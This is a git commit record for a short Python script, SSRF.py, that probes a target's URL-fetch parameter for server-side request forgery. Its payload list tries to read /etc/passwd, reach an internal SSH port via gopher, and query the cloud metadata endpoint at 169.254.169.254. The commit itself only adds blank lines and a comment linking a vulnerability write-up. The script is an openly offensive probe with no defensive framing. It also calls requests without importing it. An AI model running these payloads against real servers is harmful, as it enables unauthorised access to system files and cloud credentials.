1230d450317049fa3031dec0f8c01b3e832988b1
vikasjsharma71 <78928118+vikasjsharma71@users.noreply.github.com>
2025-07-16 13:12:52 +0530

    SSRF.py

--- SSRF.py
+++ SSRF.py
@@ -1,5 +1,13 @@
+
+
 payloads = ["file:///etc/passwd", "gopher://internal-server:22", "http://169.254.169.254/latest/meta-data"]  
 for payload in payloads:  
     response = requests.get(f"https://target.com/fetch?url={payload}")  
     if response.status_code == 200:  
         print(f"[!] Vulnerable to SSRF: {payload}") 
+
+
+
+
+# -----------------------------------------------------------------------------------------------------------------\
+# https://freedium.cfd/https://cybersecuritywriteups.com/multiple-vulnerabilities-at-indiana-university-4c324afe6bbf
